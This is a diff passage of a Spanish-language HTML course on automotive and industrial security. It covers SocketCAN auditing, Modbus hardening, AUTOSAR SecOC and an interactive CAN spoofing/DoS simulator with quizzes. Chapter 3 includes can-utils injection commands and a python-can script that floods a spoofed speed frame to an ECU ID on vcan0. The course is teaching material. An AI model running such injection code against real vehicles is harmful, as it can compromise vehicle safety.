+        <button class="action-btn primary" onclick="switchTab('tab-03', document.querySelectorAll('.nav-item')[2].querySelector('button'))">Capítulo Siguiente <i data-lucide="arrow-right" style="width:14px;height:14px;"></i></button>
+      </div>
+    </div>
+
+    <!-- TAB 03 -->
+    <div class="tab-pane" id="tab-03">
+      <div class="learning-section">
+        <h2><i data-lucide="terminal" style="width:20px;height:20px;"></i> Capítulo 3 · Automotive Hacking &amp; Auditoría CLI (SocketCAN &amp; Python)</h2>
+        <p>Para auditar la seguridad de un vehículo o banco de pruebas industrial en Linux, utilizamos la interfaz de kernel **SocketCAN** y la suite **can-utils**.</p>
+
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-lang">bash (SocketCAN Setup & Sniffing)</span>
+            <button class="code-copy-btn" onclick="copyCode(this)"><i data-lucide="copy" style="width:12px;height:12px;"></i> Copiar</button>
+          </div>
+          <pre><code><span class="cmt"># 1. Levantar interfaz CAN virtual (vcan0) para prácticas de auditoría</span>
+<span class="cmd">sudo modprobe</span> vcan
+<span class="cmd">sudo ip link</span> add dev vcan0 type vcan
+<span class="cmd">sudo ip link</span> set up vcan0
+
+<span class="cmt"># 2. Iniciar sniffer de tráfico en tiempo real</span>
+<span class="cmd">candump</span> -c -t a vcan0
+
+<span class="cmt"># 3. Inyectar trama de prueba (ID: 0x1A0 | DLC: 4 | Data: DE AD BE EF)</span>
+<span class="cmd">cansend</span> vcan0 1A0#DEADBEEF</code></pre>
+        </div>
+
+        <h3>Script en Python de Inyección y Fuzzing de ECUs</h3>
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-lang">python (python-can Exploit Script)</span>
+            <button class="code-copy-btn" onclick="copyCode(this)"><i data-lucide="copy" style="width:12px;height:12px;"></i> Copiar</button>
+          </div>
+          <pre><code><span class="kw">import</span> can
+<span class="kw">import</span> time
+
+<span class="cmt"># Conectar al bus CAN local</span>
+bus = can.interface.Bus(channel=<span class="str">'vcan0'</span>, bustype=<span class="str">'socketcan'</span>)
+
+<span class="kw">def</span> <span class="cmd">inject_spoofed_speed</span>(target_id=0x2B0):
+    <span class="cmt"># Simular inyección de velocidad engañosa (180 km/h) a la pantalla del cluster</span>
+    data = [<span class="num">0x00</span>, <span class="num">0xB4</span>, <span class="num">0x00</span>, <span class="num">0x00</span>, <span class="num">0xFF</span>, <span class="num">0x00</span>, <span class="num">0x00</span>, <span class="num">0x12</span>]
+    msg = can.Message(arbitration_id=target_id, data=data, is_extended_id=<span class="kw">False</span>)
+    
+    <span class="kw">for</span> _ <span class="kw">in</span> range(<span class="num">100</span>):
+        bus.send(msg)
+        time.sleep(<span class="num">0.01</span>) <span class="cmt"># Inyección de alta frecuencia a 100 Hz</span>
+    print(<span class="str">"[+] Inyección de Spoofing completada exitosamente."</span>)
+
+inject_spoofed_speed()</code></pre>
+        </div>
+      </div>
+
+      <div class="quiz-section">
+        <div class="quiz-title-bar"><i data-lucide="help-circle" style="width:20px;height:20px;"></i> Cuestionario — Capítulo 3</div>
+        <div class="quiz-question" id="q3-1">
+          <div class="q-text">1. ¿Qué utilidad tiene la herramienta `cansniffer` durante una auditoría en automoción?</div>
+          <div class="q-options">
+            <button class="q-option" onclick="checkAnswer(this,'q3-1',true)">A) Agrupa los frames por Arbitration ID y resalta los bytes que cambian en tiempo real al interactuar con los botones del vehículo</button>
+            <button class="q-option" onclick="checkAnswer(this,'q3-1',false)">B) Cifra automáticamente los paquetes para evitar intercepciones</button>
+            <button class="q-option" onclick="checkAnswer(this,'q3-1',false)">C) Borra el firmware del motor</button>
+          </div>
+          <div class="q-explanation">`cansniffer` es esencial para la ingeniería inversa de redes CAN. Al filtrar los paquetes estáticos y colorear los bytes variables, el auditor identifica qué ID controla el acelerador, los frenos o el cierre centralizado.</div>
+        </div>
+      </div>
+
+      <div class="module-actions">
+        <div class="read-confirmation">
+          <input type="checkbox" class="read-checkbox" id="check-03" onchange="toggleModuleRead('tab-03')">
+          <label class="read-label" for="check-03">Marcar Capítulo 3 como completado</label>
+        </div>
+        <button class="action-btn primary" onclick="switchTab('tab-04', document.querySelectorAll('.nav-item')[3].querySelector('button'))">Capítulo Siguiente <i data-lucide="arrow-right" style="width:14px;height:14px;"></i></button>
+      </div>
+    </div>
+
+    <!-- TAB 04 -->
+    <div class="tab-pane" id="tab-04">
+      <div class="learning-section">
+        <h2><i data-lucide="cpu" style="width:20px;height:20px;"></i> Capítulo 4 · Hardening de IIoT, Modbus/TCP &amp; SCADA Defense</h2>
+        <p>Los entornos de fabricación e Internet de las Cosas Industrial (<strong>IIoT</strong>) operan frecuentemente con protocolos heredados como **Modbus/TCP** sobre el puerto 502. Modbus carece de autenticación nativa, permitiendo a atacantes manipular registros de PLCs mediante comandos como `Write Single Register (Function Code 06)`.</p>
+
+        <div class="info-grid">
+          <div class="info-card">
+            <div class="info-card-icon"><i data-lucide="lock"></i></div>
+            <div class="info-card-title">Hardware Root of Trust</div>
+            <div class="info-card-desc">Integración de chips TPM 2.0 y Secure Elements en puertas de enlace IIoT para garantizar la autenticidad del firmware.</div>
+          </div>
+          <div class="info-card">
+            <div class="info-card-icon"><i data-lucide="shield"></i></div>
+            <div class="info-card-title">mTLS Autenticación</div>
+            <div class="info-card-desc">Cifrado de túneles MQTT/HTTPS utilizando Certificados X.509 de cliente y servidor en tiempo real.</div>
+          </div>
+          <div class="info-card">
+            <div class="info-card-icon"><i data-lucide="git-commit"></i></div>
+            <div class="info-card-title">DPI Industrial Firewalls</div>
+            <div class="info-card-desc">Inspección profunda de paquetes que bloquea códigos de función Modbus peligrosos a nivel de red física.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="quiz-section">
+        <div class="quiz-title-bar"><i data-lucide="help-circle" style="width:20px;height:20px;"></i> Cuestionario — Capítulo 4</div>
+        <div class="quiz-question" id="q4-1">
+          <div class="q-text">1. ¿Cuál es el principal riesgo de seguridad en el protocolo Modbus/TCP estándar?</div>
+          <div class="q-options">
+            <button class="q-option" onclick="checkAnswer(this,'q4-1',true)">A) Transmite en texto plano sin autenticación ni firma de integridad, permitiendo inyección arbitraria de datos</button>
+            <button class="q-option" onclick="checkAnswer(this,'q4-1',false)">B) Consume demasiada memoria RAM en los servidores</button>
+          </div>
+          <div class="q-explanation">Modbus fue diseñado en 1979 para redes aisladas. Cualquier dispositivo en la red local puede enviar comandos de lectura y escritura a los registros de memoria de los sensores industriales.</div>
+        </div>
+      </div>
+
+      <div class="module-actions">
+        <div class="read-confirmation">
+          <input type="checkbox" class="read-checkbox" id="check-04" onchange="toggleModuleRead('tab-04')">
+          <label class="read-label" for="check-04">Marcar Capítulo 4 como completado</label>
+        </div>
+        <button class="action-btn primary" onclick="switchTab('tab-05', document.querySelectorAll('.nav-item')[4].querySelector('button'))">Capítulo Siguiente <i data-lucide="arrow-right" style="width:14px;height:14px;"></i></button>
+      </div>
+    </div>
+
+    <!-- TAB 05 -->
+    <div class="tab-pane" id="tab-05">
+      <div class="learning-section">
+        <h2><i data-lucide="file-check-2" style="width:20px;height:20px;"></i> Capítulo 5 · Estándares ISO/SAE 21434, IEC 62443 &amp; AUTOSAR SecOC</h2>
+        <p>Para cumplir con las regulaciones internacionales (UNECE R155 / R156), los fabricantes automotrices e industriales deben certificar sus arquitecturas mediante marcos de ciberseguridad estrictos.</p>
+
+        <div class="definition-box">
+          <div class="definition-term">AUTOSAR SecOC (Secure On-Board Communication)</div>
+          <div class="definition-desc">Módulo que añade un Message Authentication Code (CMAC/HMAC) y un Contador de Frescura (Freshness Counter) a cada mensaje CAN. Esto previene ataques de suplantación y de repetición en tiempo real.</div>
+        </div>
+
+        <div class="ascii-diagram">
+┌─────────────────────────────────────────────────────────────────────────────┐
+<span style="color:var(--accent-purple)">│                 ESTRUCTURA DE FRAME SECOC PROTEGIDO                         │</span>
+│                                                                             │
+│  [ Authentic Payload (Data) ] + [ Freshness Counter ] ──► [ CMAC Engine ]   │
+│                                                                 │           │
+│                                                                 ▼           │
+│  [ CAN Frame: Original Data (4B) ] + [ Truncated Mac / SecOC (4B) ]         │
+└─────────────────────────────────────────────────────────────────────────────┘
+        </div>
+      </div>
+
+      <div class="quiz-section">
+        <div class="quiz-title-bar"><i data-lucide="help-circle" style="width:20px;height:20px;"></i> Cuestionario — Capítulo 5</div>
+        <div class="quiz-question" id="q5-1">
+          <div class="q-text">1. En AUTOSAR SecOC, ¿qué mecanismo evita que un atacante grabe un paquete legítimo y lo retransmita más tarde (Replay Attack)?</div>
+          <div class="q-options">
+            <button class="q-option" onclick="checkAnswer(this,'q5-1',true)">A) El Contador de Frescura (Freshness Value) sincronizado entre transmisor y receptor</button>
+            <button class="q-option" onclick="checkAnswer(this,'q5-1',false)">B) La resistencia física del cable del vehículo</button>
+          </div>
+          <div class="q-explanation">El Freshness Value se incrementa continuamente. Si el receptor detecta un contador repetido o antiguo, descarta el paquete de inmediato aunque la clave sea válida.</div>
+        </div>
+      </div>
+
+      <div class="module-actions">
+        <div class="read-confirmation">
+          <input type="checkbox" class="read-checkbox" id="check-05" onchange="toggleModuleRead('tab-05')">
+          <label class="read-label" for="check-05">Marcar Capítulo 5 como completado</label>
+        </div>
+        <button class="action-btn primary" onclick="switchTab('tab-06', document.querySelectorAll('.nav-item')[5].querySelector('button'))">Capítulo Siguiente <i data-lucide="arrow-right" style="width:14px;height:14px;"></i></button>
+      </div>
+    </div>
+
+    <!-- TAB 06 (Interactive Simulator) -->
+    <div class="tab-pane" id="tab-06">
+      <div class="learning-section">
+        <h2><i data-lucide="activity" style="width:20px;height:20px;"></i> Capítulo 6 · Simulador Interactivo Live CAN Bus &amp; Sistema IDS</h2>
+        <p>Experimenta en tiempo real con la inyección de vectores de ataque en un bus CAN automotriz virtual y observa cómo el módulo **IDS (Intrusion Detection System)** mitiga los ciberataques.</p>
+
+        <div class="sim-panel">
+          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1rem; border-bottom:1px solid var(--border); padding-bottom:10px;">
+            <div style="font-family:var(--font-display); font-weight:700; color:var(--accent-cyan);">
+              Panel de Control de Inyección &amp; Defensa
+            </div>
+            <div id="simSystemBadge" class="level-badge badge-success">
+              SISTEMA NORMAL
+            </div>
+          </div>
+
+          <div class="sim-controls">
+            <button class="sim-btn active" id="btnNorm" onclick="setSimMode('normal')">
+              <i data-lucide="play" style="width:14px;height:14px;"></i> Telemetría Normal
+            </button>
+            <button class="sim-btn danger" id="btnSpoof" onclick="setSimMode('spoof')">
+              <i data-lucide="zap" style="width:14px;height:14px;"></i> Inyectar RPM Spoofing (ID: 0x1A0)
+            </button>
+            <button class="sim-btn danger" id="btnDos" onclick="setSimMode('dos')">
+              <i data-lucide="radio-receiver" style="width:14px;height:14px;"></i> Inyectar DoS Flood (ID: 0x000)
+            </button>
+            <button class="sim-btn" id="btnIds" onclick="toggleIDS()" style="margin-left:auto; border-color:var(--accent-purple); color:var(--accent-purple);">
+              <i data-lucide="shield-check" style="width:14px;height:14px;"></i> Activar IDS Filter (SecOC)
+            </button>
+          </div>
+
+          <!-- Gauges Grid -->
+          <div class="telemetry-grid">
+            <div class="gauge-card">
+              <div class="gauge-title">Velocidad (KM/H)</div>
+              <div class="gauge-val" id="gaugeSpeed">85</div>
+              <div class="gauge-status" style="color:var(--accent-green)" id="statusSpeed">Estable</div>
+            </div>
+            <div class="gauge-card">
+              <div class="gauge-title">Motor RPM</div>
+              <div class="gauge-val" id="gaugeRpm">2,400</div>
+              <div class="gauge-status" style="color:var(--accent-green)" id="statusRpm">Normal</div>
+            </div>
+            <div class="gauge-card">
+              <div class="gauge-title">CAN Bus Load</div>
+              <div class="gauge-val" id="gaugeBusLoad">28%</div>
+              <div class="gauge-status" style="color:var(--accent-green)" id="statusBusLoad">Óptimo</div>
+            </div>
+            <div class="gauge-card">
+              <div class="gauge-title">Mitigación IDS</div>
+              <div class="gauge-val" id="gaugeMitigated">0</div>
+              <div class="gauge-status" style="color:var(--text-muted)" id="statusIds">Inactivo</div>
+            </div>
+          </div>
+
+          <!-- Live Terminal -->
+          <div class="terminal-box" id="termLogs">
+            <div class="term-line">
+              <span class="term-time">[00:00:01]</span>
+              <span class="term-id normal">vcan0  0x1A0  [8]</span>
+              <span class="term-data">09 60 00 55 00 00 12 00</span>
+              <span class="term-status">OK (Engine Telemetry)</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="quiz-section">
+        <div class="quiz-title-bar"><i data-lucide="help-circle" style="width:20px;height:20px;"></i> Cuestionario Final — Capítulo 6</div>
+        <div class="quiz-question" id="q6-1">
+          <div class="q-text">1. ¿Qué indicador en la consola evidencia un ataque de Denegación de Servicio (DoS) en la red CAN Bus?</div>
+          <div class="q-options">
+            <button class="q-option" onclick="checkAnswer(this,'q6-1',true)">A) Inundación masiva de tramas con Arbitration ID 0x000 al 100% de carga de bus</button>
+            <button class="q-option" onclick="checkAnswer(this,'q6-1',false)">B) Reducción del consumo de energía del microcontrolador</button>
+          </div>
+          <div class="q-explanation">Debido a la prioridad por arbitración, el ID 0x000 domina todos los ciclos de transmisión, impidiendo que el resto de las ECUs envíen telemetría legítima.</div>
+        </div>
+      </div>
+
+      <div class="module-actions">
+        <div class="read-confirmation">
+          <input type="checkbox" class="read-checkbox" id="check-06" onchange="toggleModuleRead('tab-06')">
+          <label class="read-label" for="check-06">Marcar Capítulo 6 como completado</label>
+        </div>
+        <a href="../index.html" class="action-btn primary">¡Curso Finalizado! Volver al Inicio <i data-lucide="check" style="width:14px;height:14px;"></i></a>
+      </div>
+    </div>
+  </main>
+</div>
+
+<script>
+  lucide.createIcons();
+
+  const totalModules = 6;
+  const completedSet = new Set();
+
+  let simMode = 'normal';
+  let idsActive = false;
+  let mitigatedCount = 0;
+
+  function toggleSidebar() {
+    document.getElementById('sidebar').classList.toggle('open');
+    document.getElementById('sidebarOverlay').classList.toggle('open');
+  }
+
+  function closeSidebar() {
+    document.getElementById('sidebar').classList.remove('open');
+    document.getElementById('sidebarOverlay').classList.remove('open');
+  }
+
+  function toggleTheme() {
+    const isLight = document.documentElement.classList.toggle('light');
+    localStorage.setItem('preferredTheme', isLight ? 'light' : 'dark');
+    document.getElementById('themeIcon').setAttribute('data-lucide', isLight ? 'moon' : 'sun');
+    lucide.createIcons();
+  }
+
+  function switchTab(tabId, btnElement) {
+    document.querySelectorAll('.tab-pane').forEach(el => el.classList.remove('active'));
+    document.getElementById(tabId).classList.add('active');
+
+    document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+    if (btnElement) {
+      btnElement.closest('.nav-item').classList.add('active');
+    }
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+    closeSidebar();
+  }
+
+  function checkAnswer(btn, qId, isCorrect) {
+    const parent = document.getElementById(qId);
+    const options = parent.querySelectorAll('.q-option');
+    options.forEach(opt => opt.classList.add('disabled'));
+
+    if (isCorrect) {
+      btn.classList.add('correct');
+    } else {
+      btn.classList.add('incorrect');
+    }
+    const exp = parent.querySelector('.q-explanation');
+    if (exp) exp.style.display = 'block';
+  }
+
+  function toggleModuleRead(tabId) {
+    const navItems = document.querySelectorAll('.nav-list .nav-item');
+    const index = parseInt(tabId.replace('tab-', '')) - 1;
+    const checkbox = document.getElementById('check-' + tabId.replace('tab-', ''));
+
+    if (checkbox.checked) {
+      completedSet.add(tabId);
+      navItems[index].classList.add('completed');
+    } else {
+      completedSet.delete(tabId);
+      navItems[index].classList.remove('completed');
+    }
+
+    const pct = Math.round((completedSet.size / totalModules) * 100);
+    document.getElementById('progressText').innerText = pct + '%';
+    document.getElementById('progressDetails').innerText = completedSet.size + ' de ' + totalModules + ' módulos';
+
+    const circle = document.getElementById('progressCircle');
+    const offset = 226 - (226 * pct) / 100;
+    circle.style.strokeDashoffset = offset;
+  }
+
+  function copyCode(btn) {
+    const code = btn.closest('.code-block').querySelector('pre').innerText;
+    navigator.clipboard.writeText(code);
+    btn.innerHTML = '<i data-lucide="check" style="width:12px;height:12px;"></i> Copiado';
+    lucide.createIcons();
+    setTimeout(() => {
+      btn.innerHTML = '<i data-lucide="copy" style="width:12px;height:12px;"></i> Copiar';
+      lucide.createIcons();
+    }, 2000);
+  }
+
+  /* Simulator Logic */
+  function setSimMode(mode) {
+    simMode = mode;
+    document.getElementById('btnNorm').classList.remove('active');
+    document.getElementById('btnSpoof').classList.remove('active');
+    document.getElementById('btnDos').classList.remove('active');
+
+    if (mode === 'normal') document.getElementById('btnNorm').classList.add('active');
+    if (mode === 'spoof') document.getElementById('btnSpoof').classList.add('active');
+    if (mode === 'dos') document.getElementById('btnDos').classList.add('active');
+  }
+
+  function toggleIDS() {
+    idsActive = !idsActive;
+    const btn = document.getElementById('btnIds');
+    const statusIds = document.getElementById('statusIds');
+    if (idsActive) {
+      btn.classList.add('active');
+      btn.innerHTML = '<i data-lucide="shield-check" style="width:14px;height:14px;"></i> IDS Activo (SecOC ON)';
+      statusIds.innerText = 'Protegido';
+      statusIds.style.color = 'var(--accent-purple)';
+    } else {
+      btn.classList.remove('active');
+      btn.innerHTML = '<i data-lucide="shield-check" style="width:14px;height:14px;"></i> Activar IDS Filter (SecOC)';
+      statusIds.innerText = 'Inactivo';
+      statusIds.style.color = 'var(--text-muted)';
+    }
+    lucide.createIcons();
+  }
+
+  // Live Telemetry Loop
+  setInterval(() => {
+    const logs = document.getElementById('termLogs');
+    if (!logs) return;
+
+    const timestamp = new Date().toISOString().split('T')[1].slice(0, 8);
+    let lineHtml = '';
+
+    const sysBadge = document.getElementById('simSystemBadge');
+    const gaugeSpeed = document.getElementById('gaugeSpeed');
+    const gaugeRpm = document.getElementById('gaugeRpm');
+    const gaugeBusLoad = document.getElementById('gaugeBusLoad');
+    const gaugeMit = document.getElementById('gaugeMitigated');
+
+    if (simMode === 'normal') {
+      sysBadge.className = 'level-badge badge-success';
+      sysBadge.innerText = 'SISTEMA NORMAL';
+
+      gaugeSpeed.innerText = Math.floor(82 + Math.random() * 5);
+      gaugeRpm.innerText = (2380 + Math.floor(Math.random() * 60)).toLocaleString();
+      gaugeBusLoad.innerText = Math.floor(25 + Math.random() * 5) + '%';
+
+      lineHtml = `<div class="term-line">
+        <span class="term-time">[${timestamp}]</span>
+        <span class="term-id normal">vcan0 0x1A0 [8]</span>
+        <span class="term-data">09 60 00 55 00 00 12 00</span>
+        <span class="term-status">OK (Engine)</span>
+      </div>`;
+    } 
+    else if (simMode === 'spoof') {
+      if (idsActive) {
+        mitigatedCount++;
+        gaugeMit.innerText = mitigatedCount;
+        sysBadge.className = 'level-badge badge-master';
+        sysBadge.innerText = 'ATAQUE FILTRADO POR IDS';
+
+        gaugeSpeed.innerText = '85';
+        gaugeRpm.innerText = '2,400';
+        gaugeBusLoad.innerText = '32%';
+
+        lineHtml = `<div class="term-line">
+          <span class="term-time">[${timestamp}]</span>
+          <span class="term-id" style="color:var(--accent-purple)">IDS-BLOCK 0x1A0</span>
+          <span class="term-data">FF FF 88 88 99 99 00 00</span>
+          <span class="term-status" style="color:var(--accent-purple)">BLOCKED (SecOC MAC Invalid)</span>
+        </div>`;
+      } else {
+        sysBadge.className = 'level-badge badge-danger';
+        sysBadge.innerText = 'SPOOFING EN EJECUCIÓN';
+
+        gaugeRpm.innerText = '8,500!';
+        gaugeSpeed.innerText = '220!';
+        gaugeBusLoad.innerText = '65%';
+
+        lineHtml = `<div class="term-line">
+          <span class="term-time">[${timestamp}]</span>
+          <span class="term-id">vcan0 0x1A0 [8]</span>
+          <span class="term-data">FF FF 88 88 99 99 00 00</span>
+          <span class="term-status alert">MALICIOUS SPOOF (RPM Overload)</span>
+        </div>`;
+      }
+    } 
+    else if (simMode === 'dos') {
+      if (idsActive) {
+        mitigatedCount++;
+        gaugeMit.innerText = mitigatedCount;
+        sysBadge.className = 'level-badge badge-master';
+        sysBadge.innerText = 'DoS MITIGADO POR IDS';
+
+        gaugeBusLoad.innerText = '35%';
+
+        lineHtml = `<div class="term-line">
+          <span class="term-time">[${timestamp}]</span>
+          <span class="term-id" style="color:var(--accent-purple)">IDS-RATE-LIMIT</span>
+          <span class="term-data">00 00 00 00 00 00 00 00</span>
+          <span class="term-status" style="color:var(--accent-purple)">BUS FLOOD DROPPED</span>
+        </div>`;
+      } else {
+        sysBadge.className = 'level-badge badge-danger';
+        sysBadge.innerText = 'BUS CAN DENEGADO (DoS FLOOD)';
+
+        gaugeBusLoad.innerText = '100% (CRITICAL)';
+        gaugeSpeed.innerText = 'ERR';
+        gaugeRpm.innerText = 'ERR';
+
+        lineHtml = `<div class="term-line">
+          <span class="term-time">[${timestamp}]</span>
+          <span class="term-id">vcan0 0x000 [8]</span>
+          <span class="term-data">00 00 00 00 00 00 00 00</span>
+          <span class="term-status alert">BUS-OFF FLOOD ATTACK</span>
+        </div>`;
+      }
+    }
+
+    logs.insertAdjacentHTML('afterbegin', lineHtml);
+    if (logs.children.length > 25) {
+      logs.removeChild(logs.lastChild);
+    }
+  }, 1200);
+</script>
+</body>
+</html>
